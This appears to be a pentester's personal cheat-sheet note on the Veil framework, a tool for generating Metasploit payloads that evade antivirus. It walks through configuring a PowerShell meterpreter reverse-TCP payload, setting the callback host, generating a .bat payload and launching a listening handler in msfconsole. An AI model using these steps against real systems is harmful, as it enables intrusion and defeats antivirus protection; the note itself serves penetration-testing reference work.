# 💢 veil framework
Tags: 
Related to: 
See also: 
Previous: [[Exploitation Tools]]

---
## Description

Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.

- **Evasion** - Creates payloads designed to evade antivirus tools and other antimalware products.
- **Ordnance**	- Focused on running payloads on a target machine and is especially useful if Metasploit or Microsoft Sysinternals PsExec cannot cause code to run on a target machine.

## Usage Examples

#### Get a list of available commands
	<Tab><Tab>

### Evasion

	use evasion
	list
	auxilary/coldwar_wrapper		// Takes a Windows EXE file and converts it to a Web Archive (WAR) file for execution in a Java Runtime environment.
	auxilary/pyinstaller_wrapper	// Takes a Python program and converts it to a Windows executable using the pyinstaller application.

	info powershell/meterpreter_rev_tcp.py
	use powershell/meterpreter_rev_tcp.py
	options
	set LHOST 10.10.10.100
	generate

	/var/lib/veil/output/source/560veil.bat		// The payload.
	/var/lib/veil/output/handlers/560veil.rc	// Metasploit configuration file (also known as a handler file) for a multi/handler waiting for a connection from our payload.

	msfconsole -r /var/lib/veil/output/handlers/560veil.rc		// multi/handler runs in background.

---
## References
- https://github.com/Veil-Framework/Veil